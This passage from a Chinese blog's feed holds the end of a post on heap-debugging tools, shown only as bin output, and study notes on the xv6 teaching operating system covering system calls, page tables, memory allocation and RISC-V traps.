class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x6032d0 (size : 0x20d30) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x20)   tcache_entry[0](1): 0x6032c0</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;pwndbg + pwngdb + angelheap&lt;/p&gt;</summary>
    
    
    
    <category term="Tools" scheme="https://humoooor.cn/categories/Tools/"/>
    
    
    <category term="Pwn" scheme="https://humoooor.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Xv6</title>
    <link href="https://humoooor.cn/2022/10/14/Xv6/"/>
    <id>https://humoooor.cn/2022/10/14/Xv6/</id>
    <published>2022-10-14T02:51:00.000Z</published>
    <updated>2023-05-23T03:22:08.733Z</updated>
    
    <content type="html"><![CDATA[<p>本文是笔者在学习 MIT 6.1810 2022 Fall 阅读 xv6 文档时所写，大部分是将原文翻译，笔者尽可能加入自己的理解并排版，<del>应该会</del>持续更新直到文档读完</p><span id="more"></span><h2 id="Chapter-1-Operating-system-interfaces"><a href="#Chapter-1-Operating-system-interfaces" class="headerlink" title="Chapter 1 Operating system interfaces"></a>Chapter 1 Operating system interfaces</h2><p>xv6 实现的 Unix kernel 的服务和系统调用的子集</p><p>在 user 目录下可查看程序源码</p><table><thead><tr><th align="center">System call</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">int fork()</td><td align="center">创建一个进程，返回子进程的 PID</td></tr><tr><td align="center">int exit(int status)</td><td align="center">结束当前进程，status 返回给 wait()</td></tr><tr><td align="center">int wait(int *status)</td><td align="center">等待一个子进程 exit，exit 的 status 在 *status中，返回子进程 PID，没有子进程返回 -1</td></tr><tr><td align="center">int kill(int pid)</td><td align="center">结束 PID 对应的进程，返回 0 或 -1</td></tr><tr><td align="center">int getpid()</td><td align="center">返回当前进程的 PID</td></tr><tr><td align="center">int sleep(int n)</td><td align="center">暂停 n 个时钟</td></tr><tr><td align="center">int exec(char *file, char *argv[])</td><td align="center">加载文件并使用参数执行，仅在错误时返回</td></tr><tr><td align="center">char *sbrk(int n)</td><td align="center">内存增加 n 字节，返回新内存的首地址</td></tr><tr><td align="center">int open(char *file, int flags)</td><td align="center">打开文件，flags 表示读写，返回一个 fd</td></tr><tr><td align="center">int write(int fd, char *buf, int n)</td><td align="center">从 buf 向 fd 写 n 字节，返回 n</td></tr><tr><td align="center">int read(int fd, char *buf, int n)</td><td align="center">从 fd 读 n 字节向 buf 写入，返回读的字节数</td></tr><tr><td align="center">int close(int fd)</td><td align="center">释放 fd</td></tr><tr><td align="center">int dup(int fd)</td><td align="center">返回与 fd 相同文件的一个新的 fd</td></tr><tr><td align="center">int pipe(int p[])</td><td align="center">创建一个管道，将读写 fd 放入 p[0] 和 p[1]</td></tr><tr><td align="center">int chdir(char *dir)</td><td align="center">改变当前目录</td></tr><tr><td align="center">int mkdir(char *dir)</td><td align="center">创建一个目录</td></tr><tr><td align="center">int mknod(char *file, int, int)</td><td align="center">创建一个设备文件</td></tr><tr><td align="center">int fstat(int fd, struct stat *st)</td><td align="center">读取文件信息放入 st</td></tr><tr><td align="center">int stat(char *file, struct stat *st)</td><td align="center">读取文件信息放入 st</td></tr><tr><td align="center">int link(char *file1, char *file2)</td><td align="center">为 file1 创建另一个名字 file2，即硬链接</td></tr><tr><td align="center">int unlink(char *file)</td><td align="center">删除一个文件</td></tr></tbody></table><p>如果没有另外说明，系统调用返回 0 为正常，返回 -1 为错误</p><h3 id="进程和内存"><a href="#进程和内存" class="headerlink" title="进程和内存"></a>进程和内存</h3><p>父子进程的内存关系</p><h3 id="I-O-和文件描述符"><a href="#I-O-和文件描述符" class="headerlink" title="I/O 和文件描述符"></a>I/O 和文件描述符</h3><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>p[0] 为读端，p[1] 为写端</p><p>如果读端没有数据，read 会等待数据写入或等待指向写端的所有 fd 关闭，后者类似到文件结尾， read 会返回 0</p><p>如果 read 到读端，会一直等待</p><p>shell 可以用 | 符号实现管道</p><p><code>grep fork sh.c | wc -l</code> 将 | 左边的结果通过管道流向右边</p><p>多 | 可以创建进程树</p><ol><li>管道可以自己清理自己</li><li>可以通过任意长度的数据流</li><li>管道可以并行执行</li></ol><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>#todo</p><h3 id="真实世界"><a href="#真实世界" class="headerlink" title="真实世界"></a>真实世界</h3><p>Unix 系统调用接口通过 POSIX 标准进行标准化</p><h2 id="Chapter-2-Operating-system-organization"><a href="#Chapter-2-Operating-system-organization" class="headerlink" title="Chapter 2 Operating system organization"></a>Chapter 2 Operating system organization</h2><p>三个要求</p><ul><li>多路复用</li><li>隔离</li><li>交互</li></ul><h3 id="抽象物理资源"><a href="#抽象物理资源" class="headerlink" title="抽象物理资源"></a>抽象物理资源</h3><p>每个应用程序直接访问物理资源</p><ul><li>效率高</li><li>需要应用程序之间可信且没有错误</li></ul><p>因此需要进行<strong>强隔离</strong>，同时也会提供便利</p><p>禁止应用程序直接访问敏感的硬件资源，将资源抽象为服务</p><h3 id="用户-管理者模式，系统调用"><a href="#用户-管理者模式，系统调用" class="headerlink" title="用户/管理者模式，系统调用"></a>用户/管理者模式，系统调用</h3><p>强隔离需要应用程序和操作系统之间有硬边界</p><p>CPU 能提供硬件支持</p><p>RISC-V 的 CPU 有三种模式：机器模式、管理者（supervisor）模式、用户模式</p><ul><li>机器模式<ul><li>执行的指令具有完全特权</li><li>主要用具配置计算机，运行一段代码后会进入内核模式</li></ul></li><li>管理者模式<ul><li>CPU 可执行特权指令<ul><li>启用、禁用终端</li><li>读写页表寄存器</li></ul></li></ul></li><li>用户模式<ul><li>CPU 不能执行特权指令<ul><li>如果尝试执行，CPU 会切换到管理者模式，并且杀死应用程序</li></ul></li><li>通过系统调用来调用内核函数<ul><li>系统调用会跳转到内核指定的入口点</li><li>CPU 从用户模式切换到管理者模式</li><li>内核可以验证系统调用的参数是否合理，决定是否进行请求的操作</li></ul></li></ul></li></ul><p>内核和管理者模式似乎有点分不清？</p><p>笔者的理解：管理者模式是 RISC-V 的 CPU 定义的，相对于用户模式多了一些特权；内核是相对用户代码而言，运行在不同的模式下。模式对应着身份，内核和用户代码对应着一个实体</p><h3 id="内核架构"><a href="#内核架构" class="headerlink" title="内核架构"></a>内核架构</h3><h4 id="宏内核设计"><a href="#宏内核设计" class="headerlink" title="宏内核设计"></a>宏内核设计</h4><p>缺点：操作系统不同部分之间的接口复杂，编写代码容易出错</p><h4 id="微内核设计"><a href="#微内核设计" class="headerlink" title="微内核设计"></a>微内核设计</h4><p>最大限度地减少内核模式下运行的操作系统代码数量，在用户模式下执行操作系统的大部分功能</p><h3 id="xv6-kernel-代码架构"><a href="#xv6-kernel-代码架构" class="headerlink" title="xv6 kernel 代码架构"></a>xv6 kernel 代码架构</h3><table><thead><tr><th>文件</th><th>描述</th><th>文件</th><th>描述</th></tr></thead><tbody><tr><td>bio.c</td><td>文件系统的磁盘块缓冲</td><td>proc.c</td><td>进程和调度</td></tr><tr><td>console.c</td><td>连接到用户键盘和屏幕</td><td>sleeplock.c</td><td>放弃 CPU 的锁</td></tr><tr><td>entry.S</td><td>第一次启动的指令</td><td>spinlock.c</td><td>不放弃 CPU 的锁</td></tr><tr><td>exec.c</td><td><code>exec()</code> 系统调用</td><td>start.c</td><td>机器模式早期启动代码</td></tr><tr><td>file.c</td><td>文件描述符</td><td>string.c</td><td>C 字符串和字节数组代码库</td></tr><tr><td>fs.c</td><td>文件系统</td><td>swtch.S</td><td>线程切换</td></tr><tr><td>kalloc.c</td><td>物理页分配器</td><td>syscall.c</td><td>系统调用的调度</td></tr><tr><td>kernelvec.S</td><td>处理来自内核的陷阱，定时器中断</td><td>sysfile.c</td><td>文件相关的系统调用</td></tr><tr><td>log.c</td><td>文件系统日志记录和崩溃恢复</td><td>sysproc.c</td><td>进程相关的系统调用</td></tr><tr><td>main.c</td><td>启动阶段控制其他模块的初始化</td><td>trampoline.S</td><td>切换用户/内核模式的汇编</td></tr><tr><td>pipe.c</td><td>管道</td><td>trap.c</td><td>处理陷阱和中断并从中返回</td></tr><tr><td>plic.c</td><td>RISC-V 中断控制器</td><td>uart.c</td><td>串口控制台设备驱动</td></tr><tr><td>printf.c</td><td>格式化输出到控制台</td><td>virtio_disk.c</td><td>磁盘设备驱动</td></tr><tr><td>vm.c</td><td>管理页表和地址空间</td><td>defs.h</td><td>模块间接口的定义</td></tr></tbody></table><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><h4 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h4><p>每个进程有一个单独的页表，定义了进程的地址空间</p><ul><li><p>有许多因素限制了进程地址空间的最大值</p><ul><li>RISC-V 的指针为 64 位</li><li>在页表中查找虚拟地址时，硬件仅使用低 39 位</li><li>xv6 只使用 38 位 #why</li><li>因此最大地址位 2^38^ - 1 = 0x3fffffffff，即 MAXVA（在 <code>kernel/risc.h</code> 中定义）、</li></ul></li><li><p>在地址空间的顶部保留了一页用作 trampoline（跳板、蹦床），一页用作映射进程的 trapframe（陷阱帧），xv6 用这两个页面进入和退出内核</p><ul><li>trampoline 包含进入和退出内核的代码</li><li>trapframe 映射用于保存和恢复用户进程的状态</li></ul></li></ul><h4 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h4><p>xv6 内核维护每个进程的状态，存放到 proc 结构体中（<code>kernel/proc.h</code>）</p><p>最重要的部分是页表、内核栈、运行状态</p><p><code>p-&gt;state</code> 表示进程状态（分配、准备运行、等待IO、正在退出）</p><p><code>p-&gt;pagetable</code> 保存页表，还用作存储进程内存的物理页地址的记录</p><h4 id="栈空间"><a href="#栈空间" class="headerlink" title="栈空间"></a>栈空间</h4><ul><li>每个进程有两个栈：用户栈和内核栈（p-&gt;kstack）</li><li>在执行用户指令时，只有用户栈在使用，内核栈为空</li><li>当进入内核模式（系统调用或中断），内核代码会在内核栈上执行，用户栈不变</li><li>内核栈是独立的，即使进程破坏了用户栈，内核也可以执行</li></ul><h3 id="启动-xv6，第一个进程和系统调用的代码"><a href="#启动-xv6，第一个进程和系统调用的代码" class="headerlink" title="启动 xv6，第一个进程和系统调用的代码"></a>启动 xv6，第一个进程和系统调用的代码</h3><ol><li>RISC-V 开机时，会自行初始化，运行存储在 ROM 中的引导加载程序</li><li>引导加载程序将 xv6 内核加载到内存 0x80000000 中，因为 0 ~ 0x80000000 之间包含 IO 设备（RISC-V 在分页硬件禁用和虚拟地址直接映射到物理地址条件下开始）</li><li>在机器模式下，从 _entry 开始执行 xv6<ul><li>_entry 的指令设置一个栈，以便 xv6 运行 C 代码</li><li>xv6 在 <code>kernel/start.c</code> 中声明一个初始栈 stack0 的空间</li><li>_entry 的代码将栈顶寄存器 sp 加载到 stack0 的顶部 stack0+0x1000</li><li>接下来调用 <code>kernel/start.c</code> 中的代码</li></ul></li><li>start 函数<ul><li>先在机器模式执行配置代码<ul><li>修改 mstatus 寄存器中 MPP（Machine Previous Privilege mode）的值为 Supervisor，在 mret 时返回到管理者模式</li><li>将 main 的地址写入 mepc 寄存器作为 mret 返回地址</li><li>将所有中断和异常委托给内核</li><li>将 0 写入 satp 页表寄存器，禁用内核模式下的虚拟内存转换</li><li>对时钟芯片编程来生成计时器中断</li></ul></li><li>然后通过 mret 指令切换到管理者模式，进入内核，执行 main 函数<ul><li>mret 常用于在进入机器模式后返回到管理者模式</li><li>start 会将前一个模式设置为管理者模式，以便符合 mret 的条件</li></ul></li></ul></li><li>main 函数<ul><li>初始化控制台</li><li>初始化物理页分配器</li><li>创建内核页表</li><li>加载启动页面</li><li>初始化进程表</li><li>设置内核的 trap 处理位置</li><li>初始化中断控制 PLIC</li><li>通过中断请求 PLIC 访问设备</li><li>初始化 buffer 缓存</li><li>初始化 inode 缓存</li><li>初始化文件系统</li><li>初始化磁盘</li><li>进入 userinit 函数</li></ul></li><li>userinit 函数<ul><li>创建第一个进程</li><li>执行用 RISC-V 编写的小程序，使用第一个系统调用</li><li>在 <code>user/initcode.S</code> 中把 SYS_exec 系统调用号传给 a7 寄存器，然后调用 ecall 进入内核</li></ul></li></ol><h3 id="安全模型"><a href="#安全模型" class="headerlink" title="安全模型"></a>安全模型</h3><p>#todo</p><h3 id="真实世界-1"><a href="#真实世界-1" class="headerlink" title="真实世界"></a>真实世界</h3><p>大多数操作系统采用了进程的概念，但是现代操作系统的进程支持多个线程，以允许单个进程利用多个 CPU，潜在地更改了接口（如 Linux 的 clone，fork 的一种变体），来控制线程共享的各个方面</p><h2 id="Chapter-3-Page-tables"><a href="#Chapter-3-Page-tables" class="headerlink" title="Chapter 3 Page tables"></a>Chapter 3 Page tables</h2><p>#todo </p><h3 id="分页硬件"><a href="#分页硬件" class="headerlink" title="分页硬件"></a>分页硬件</h3><p>#todo</p><h3 id="内核地址空间"><a href="#内核地址空间" class="headerlink" title="内核地址空间"></a>内核地址空间</h3><p>#todo</p><h3 id="代码：创建一个地址空间"><a href="#代码：创建一个地址空间" class="headerlink" title="代码：创建一个地址空间"></a>代码：创建一个地址空间</h3><p>大多数处理地址空间和页表的代码在 <code>kernel/vm.c</code> 中</p><p>数据结构 pagetable_t，是指向 RISC-V 根页表的指针 <code>typedef uint64 *pagetable_t</code>，它可以是内核或每个进程的页表</p><ul><li>中心函数是 walk 和 mappages<ul><li>walk：从页表中查找虚拟地址对应的 PTE</li><li>mappages：为新映射安装 PTE</li></ul></li><li>kvm 开头的函数操作内核页表</li><li>uvm 开头的函数操作用户页表</li><li><code>copyin</code> 和 <code>copyout</code> 用于用户与内核之间传输数据</li></ul><h4 id="系统启动"><a href="#系统启动" class="headerlink" title="系统启动"></a>系统启动</h4><p>一开始，main 调用 <code>kvminit</code> 来使用 <code>kvmmake</code> 创建内核页表，在此之前，地址直接映射到物理内存</p><p>然后调用 <code>kvminithart</code> 来安装内核页表，将根页表的物理地址写入 satp 寄存器，在此之后 CPU 会使用内核页表转换地址</p><p><strong>kvmmake</strong> </p><ul><li>首先分配一页物理内存来保存根页表</li><li>然后调用 <code>kvmmap</code> 来安装内核需要的 PTE<ul><li>包括内核的指令和数据，最高到 PHYSTOP 的物理内存，设备的内存范围</li></ul></li><li>然后调用 <code>proc_mapstacks</code> 给每个进程分配一个内核栈<ul><li>它调用 kvmmap 把每个栈映射到 KSTACK 生成的虚拟地址，留出了保护页的空间</li></ul></li></ul><p><strong>kvmmap</strong></p><ul><li>调用 <code>mappages</code> 安装 PTE</li></ul><p><strong>mappages</strong></p><ul><li>它对每个虚拟地址先调用 walk 查找对应的 PTE 地址</li><li>然后初始化 PTE 保存对应的 PPN 和 权限标志位</li></ul><p><strong>walk</strong></p><ul><li>它对三级页表进行查询对应的 PTE</li><li>若 PTE 无效且设置了 alloc 参数，walk 会分配一个新的页面，并把物理地址放入 PTE</li><li>最后返回第三级页表的 PTE 地址</li></ul><h3 id="物理内存分配"><a href="#物理内存分配" class="headerlink" title="物理内存分配"></a>物理内存分配</h3><p>xv6 在内核结尾与 PHSYTOP 之间分配运行时内存，一次分配和释放 4KB</p><p>xv6 追踪哪些页面是 freed，通过建立一个链表</p><p>分配包括从链表中移除，释放包括将 freed 页加入从链表中</p><h3 id="代码：物理内存分配器"><a href="#代码：物理内存分配器" class="headerlink" title="代码：物理内存分配器"></a>代码：物理内存分配器</h3><p>分配器位于 kernel/kalloc.c 中</p><p>数据结构是一个 free 链表，每个元素是 <code>struct run</code>，链表由一个 spin lock 保护，锁调用 <code>acquire</code> 和 <code>release</code>，链表和锁被包装在 kmem 结构体中</p><figure class="highlight c"><figcaption><span>kernel/kalloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">&#125; kmem;</span><br></pre></td></tr></table></figure><p>xv6 应该通过解析硬件的配置信息来决定有多少物理内存可用</p><p>main 函数调用 <code>kinit</code> 来初始化分配器</p><p><strong>kinit</strong></p><p>初始化 free 链表来保存 free memory 的每一页（kernel 末尾与 PHSYTOP 之间的内存空间）</p><p><code>kinit</code> 调用 <code>freerange</code> 来对每一页调用 kfree 向 free 链表添加内存</p><p><code>freerange</code> 使用 PGROUNDUP 确保物理地址对齐（类似向上取整）</p><p><code>kfree</code> 会将释放的页面所有值设为 1，然后使用头插法将页面首地址加入 free 链表</p><h3 id="进程地址空间"><a href="#进程地址空间" class="headerlink" title="进程地址空间"></a>进程地址空间</h3><p>每个进程有一个单独的页表</p><table><thead><tr><th>Address</th><th>section</th><th>Permission</th></tr></thead><tbody><tr><td>MAXVA</td><td>trapline</td><td>RX–</td></tr><tr><td></td><td>trapframe</td><td>R-W-</td></tr><tr><td></td><td>unused</td><td></td></tr><tr><td></td><td>heap</td><td>R-WU</td></tr><tr><td></td><td>stack</td><td>R-WU</td></tr><tr><td></td><td>guard page</td><td></td></tr><tr><td></td><td>data</td><td>R-WU</td></tr><tr><td>Page aligned</td><td>unused</td><td></td></tr><tr><td>0</td><td>text</td><td>R-XU</td></tr></tbody></table><p>trampoline 和 trapframe 映射在高地址，用户模式不可访问</p><p>trampoline：在调用 ecall 时会跳转到这里</p><p>trapframe：在调用 ecall 时，用户进程的通用寄存器会保存在这里</p><h3 id="代码：sbrk"><a href="#代码：sbrk" class="headerlink" title="代码：sbrk"></a>代码：sbrk</h3><p>系统调用 sbrk 用于进程增减内存大小，由 growproc 实现</p><p>growproc 根据 n 的正负，调用 uvmalloc 或 uvmdealloc</p><p>uvmalloc 调用 kalloc 分配物理内存，然后调用 mappages 向用户页表添加 PTE</p><p>uvmdealloc 调用 uvmunmap，uvmunmap 使用 walk 找到对应的 PTE 和 kfree 释放物理内存</p><h3 id="代码：exec"><a href="#代码：exec" class="headerlink" title="代码：exec"></a>代码：exec</h3><p>exec 使用 namei 打开二进制文件，然后读取 ELF 头</p><p>一个 ELF 文件包含一个 ELF 头（struct elfhdr），一系列程序 section 头（struct proghdr），每个 struct proghdr 描述了程序必须加载到内存中的 section，xv6 程序有两个，一个指令，一个是数据</p><ul><li>第一步是检查文件是否是 ELF 文件，它从 4 字节的魔术数字开始（0x7F，’E’，’L’，’F’，或者 ELF_MAGIC）</li><li>使用 proc_pagetable 分配一个没有用户映射的新页表，用 uvmalloc 给每个 ELF 段分配内存，用 loadseg 加载每个段到内存中，loadseg 使用 walkaddr 找到物理地址写入每个段。使用 readi 读取每个段</li><li>分配并初始化一页用户栈，将参数字符串复制到栈顶，在 ustack 记录字符串指针，ustack 前三个是 fake 返回程序计数器，argc 和 argv</li><li>exec 会在栈页的下面放一个不可访问的页<ul><li>在准备新的内存镜像时，如果检测到一个错误（如无效的程序段），会跳转到 bad 标签，释放新的镜像，返回 -1。一旦镜像完成，exec 提交新的页表，释放旧的</li></ul></li><li>exec 从文件指定的地址将数据加载到内存中，因此 exec 是有风险的，需要执行很多检查</li></ul><h3 id="Real-world"><a href="#Real-world" class="headerlink" title="Real world"></a>Real world</h3><p>真正的内存分配器需要处理小分配和大分配</p><h2 id="Chapter-4-Traps-and-system-calls"><a href="#Chapter-4-Traps-and-system-calls" class="headerlink" title="Chapter 4 Traps and system calls"></a>Chapter 4 Traps and system calls</h2><p><em>trap</em>（陷阱）是让CPU 搁置普通指令的执行，并将控制权转移到处理该事件的特殊代码</p><ul><li>系统调用</li><li>异常<ul><li>除以 0 或使用无效的虚拟地址等</li></ul></li><li>中断<ul><li>设备发出信号，如磁盘完成读写请求时</li></ul></li></ul><p>通常，trap 发生时执行的代码不久后都需要恢复，代码并不需要意识到发生了任何特殊情况</p><ul><li>异常处理<ol><li>trap 强制将控制权转移给内核</li><li>内核保存寄存器和其他状态</li><li>内核执行处理代码</li><li>内核恢复保存的寄存器和状态并从陷阱中返回</li><li>原始代码从它停止的地方恢复</li></ol></li></ul><p>Xv6 在内核中处理所有 trap，trap 不会传递给用户代码</p><p><strong>隔离</strong>要求只有内核可以使用硬件设备，且内核是一种方便的机制，可以在多个进程之间共享设备，不互相干扰，这对于异常也有意义，xv6 通过杀死违规程序来处理用户空间的所有异常</p><p>Xv6 处理 trap 有四个阶段</p><ol><li>RISC-V CPU 进行硬件操作</li><li>一些为内核 C 代码做好准备的汇编指令</li><li>决定如何处理 trap 的 C 函数</li><li>系统调用或设备驱动程序服务例程</li></ol><p>处理 trap 的代码（汇编或 C）被称为 <em>handler</em></p><p>handler 的第一步通常用汇编语言编写，称为 <em>vector</em></p><h3 id="RISC-V-trap-机制"><a href="#RISC-V-trap-机制" class="headerlink" title="RISC-V trap 机制"></a>RISC-V trap 机制</h3><h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p>控制寄存器：内核可读写，用于告诉 CPU 怎么处理 trap</p><ul><li>stvec：保存内核处理 trap 的地址，发生 trap 时会跳转到该地址<ul><li>Supervisor Trap Vector</li><li>用户模式下会指向内核代码的 <code>usertrap</code></li><li>内核模式下会指向内核代码的 <code>kerneltrap</code></li></ul></li><li>sepc：发生 trap 时保存当前的 pc，在使用 sret 指令时，会跳转到 sepc 指向的地址<ul><li>Supervisor Exception Program Counter</li><li>sret：从 trap 返回</li><li>内核可控制 sepc 让 sret 返回到适当的位置</li></ul></li><li>scause：描述 trap 类型<ul><li>Supervisor Trap Cause</li><li>8 表示系统调用</li><li>其他表示错误或者中断</li></ul></li><li>sscatch：辅助作用，防止在保存用户寄存器前将其覆盖<ul><li>一般用来保存 a0</li><li><del>在 xv6 的 2020 版本用来保存 trapframe 地址</del></li></ul></li><li>sstatus：以 bitmap 形式保存一些控制信息<ul><li>Supervisor Status</li><li>SPP：表示 trap 来自用户模式（0）还是管理者模式（1），并且用来告诉 sret 返回到哪个模式</li><li>SIE：表示是否允许设备中断，若为 0 则 RISC-V 会推迟设备中断</li></ul></li></ul><p>在机器模式下有一组类似的控制寄存器，xv6 只在定时器中断的情况下使用</p><h4 id="处理-trap-前"><a href="#处理-trap-前" class="headerlink" title="处理 trap 前"></a>处理 trap 前</h4><p>下面是除 定时器中断 外的 trap</p><ol><li>将 sstatus 的 SIE 位 置零<ul><li>如果是设备中断，不会继续下面的操作</li></ul></li><li>将 pc 复制给 sepc</li><li>保存当前模式到 sstatus 的 SSP </li><li>设置 scause 表示 trap 原因</li><li>设置为管理者模式</li><li>将 stvec 复制给 pc</li><li>开始执行新的 pc 指向的指令</li></ol><p><strong>注意</strong>：此时没有转换为内核页表，没有转换为内核栈，也没有保存除 pc 外的任何寄存器，这些需要由内核来实现</p><p>原因：这样能提供给内核更好的灵活性，例如在内核中发生 trap 并不需要转换页表，可以提高处理 trap 的性能</p><h4 id="相关的汇编指令"><a href="#相关的汇编指令" class="headerlink" title="相关的汇编指令"></a>相关的汇编指令</h4><ul><li>ecall<ul><li>environment call</li><li>系统调用，一种 trap</li></ul></li><li>sret<ul><li>Supervisor Return</li><li>将模式从管理者模式更改为指定的模式（sstatus 的 SPP 位）</li><li>将 sepc 寄存器复制给 pc 寄存器</li><li>启用设备中断（将 sstatus 的 SIE 位设为 1）</li></ul></li><li>csrw<ul><li>写入控制寄存器 <code>csrw sscratch, a0</code></li></ul></li><li>csrr<ul><li>读取控制寄存器 <code>csrr t0, sscratch</code></li></ul></li></ul><h3 id="用户-trap"><a href="#用户-trap" class="headerlink" title="用户 trap"></a>用户 trap</h3><p>来自用户空间的 trap 的处理流程</p><ol><li><code>uservec</code>（kernel/trampoline.S）</li><li><code>usertrap</code>（kernel/trap.c）</li><li><code>usertrapret</code>（kernel/trap.c）</li><li><code>userret</code>（kernel/trapline.S）</li></ol><h4 id="trampoline"><a href="#trampoline" class="headerlink" title="trampoline"></a>trampoline</h4><p>由于RISC-V 硬件在发生 trap 时不会转换页表，这意味着 stvec 保存的地址（处理 trap 的地址）必须在用户页表中存在有效映射，并且在转换成内核页表后，必须在内核页表中也存在有效映射</p><p>Xv6 使用了一个 <em>trampoline</em> 页表来解决上面的限制条件</p><p>trampoline 页面包含 stvec 指向的 <code>uservec</code> 程序和用于返回到用户代码的 <code>userret</code> 程序</p><p>trampoline 在内核每个进程的页表中都映射到了 TRAMPOLINE（0x3ffffff000）地址上，位于虚拟地址顶部，它只允许管理者模式执行</p><h4 id="trapframe"><a href="#trapframe" class="headerlink" title="trapframe"></a>trapframe</h4><p>通用寄存器内容会保存到一个 trapframe 结构体，它通常在用户页表中映射到与 trampoline 相邻的位置（0x3fffffe000），且也只允许管理者模式访问</p><p>它的物理地址保存在 proc 结构体的 trapframe 成员变量中，以便内核能通过内核页表直接访问它</p><figure class="highlight c"><figcaption><span>kernel/proc.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> &#123;</span></span><br><span class="line">  <span class="comment">/*   0 */</span> uint64 kernel_satp;   <span class="comment">// kernel page table</span></span><br><span class="line">  <span class="comment">/*   8 */</span> uint64 kernel_sp;     <span class="comment">// top of process&#x27;s kernel stack</span></span><br><span class="line">  <span class="comment">/*  16 */</span> uint64 kernel_trap;   <span class="comment">// usertrap()</span></span><br><span class="line">  <span class="comment">/*  24 */</span> uint64 epc;           <span class="comment">// saved user program counter</span></span><br><span class="line">  <span class="comment">/*  32 */</span> uint64 kernel_hartid; <span class="comment">// saved kernel tp</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>kernel_satp<ul><li>保存 kernel 页表地址</li></ul></li><li>kernel_sp<ul><li>保存进程的内核栈顶地址</li></ul></li><li>kernel_trap<ul><li>保存内核代码中的 <code>usertrap</code> 位置</li></ul></li><li>epc<ul><li>保存用户的 pc</li><li>在 <code>usertrap()</code> 中会将 sepc 寄存器内容保存到这里</li><li>因为可能会跳转到另一个用户进程去执行，sepc 寄存器可能会被更改</li></ul></li><li>kernel_hartid<ul><li>CPU 核心 id，表示该进程在哪个 CPU 核心运行，从 0 开始</li></ul></li><li>剩下的是通用寄存器</li></ul><h4 id="uservec"><a href="#uservec" class="headerlink" title="uservec"></a>uservec</h4><p><code>uservec</code> 代码位于 kernel/trampoline.S 中</p><p>它的作用是保存用户代码的通用寄存器，切换内核栈、内核页表等，跳转到内核中处理 trap 的位置 <code>usertrap</code>（kernel/proc.c）</p><h4 id="usertrap"><a href="#usertrap" class="headerlink" title="usertrap"></a>usertrap</h4><p><code>usertrap</code> 代码位于 kernel/trap.c 中</p><p>它的作用是确定 trap 的原因，处理它并返回</p><ol><li>首先将 stvec 更改为 <code>kernelvec</code>（kernel/kenelvec.S），这样在内核中发生 trap 时，会进入 <code>kerneltrap</code> 进行处理，而不会进入 <code>usertrap</code></li><li>将 sepc 保存到 trapframe 中，因为 trap 有可能时计时器中断，转换到另一个进程去执行，会将 sepc 覆盖</li><li>根据 trap 种类<ul><li>系统调用<ul><li>p-&gt;trapframe-&gt;epc +=4 这样在回到用户进程时，会执行下一条指令，而不是再执行 ecall</li><li>启用设备中断</li><li>调用 <code>syscall</code> 来执行对应的系统调用</li></ul></li><li>设备中断<ul><li>调用 <code>devintr</code> 处理</li></ul></li><li>异常<ul><li>杀死出错的进程</li></ul></li></ul></li><li>检查进程是否被杀死，若杀死则调用 <code>exit</code> 退出</li><li>检查是否是计时器中断，若是则调用 <code>yield</code> 放弃 CPU</li></ol><h4 id="usertrapret"><a href="#usertrapret" class="headerlink" title="usertrapret"></a>usertrapret</h4><p><code>usertrapret</code> 代码位于 kernel/trap.c 中</p><p>它的作用是设置 trapframe 和控制寄存器</p><ol><li>将 stvec 更改为 <code>uservec</code>（kernel/trampoline.S）</li><li>设置 trapframe 中 <code>uservec</code> 需要使用的字段</li><li>设置 sstatus</li><li>设置 sepc 为之前保存的 pc</li><li>将用户页表放入 a0 传递给 <code>userret</code></li></ol><h4 id="userret"><a href="#userret" class="headerlink" title="userret"></a>userret</h4><p><code>userret</code> 代码位于 kernel/trampoline.S 中</p><p>它的作用是切换为用户页表，从 trapframe 中恢复通用寄存器，调用 sret 跳转 sepc 指向的地址，返回到用户模式</p><h3 id="代码：调用系统调用"><a href="#代码：调用系统调用" class="headerlink" title="代码：调用系统调用"></a>代码：调用系统调用</h3><p>user/initcode.S 将 exec 的参数放在 a0 和 a1 寄存器中，把系统调用号放在 a7 中</p><p>ecall 指令进入内核，执行 <code>uservec</code>、<code>usertrap</code> 和 <code>syscall</code> 执行</p><p><code>syscall</code> 在 trapframe 中检索 a7 保存的系统调用号，并用它索引到 syscall 中</p><p>当 <code>syscall</code> 返回时，将返回值记录到 p-&gt;trapframe-&gt;a0 中</p><p>然后用户空间的 <code>exec</code> 函数会将该值返回</p><p>系统调用号无效，会打印错误然后返回 -1</p><h3 id="代码：系统调用参数"><a href="#代码：系统调用参数" class="headerlink" 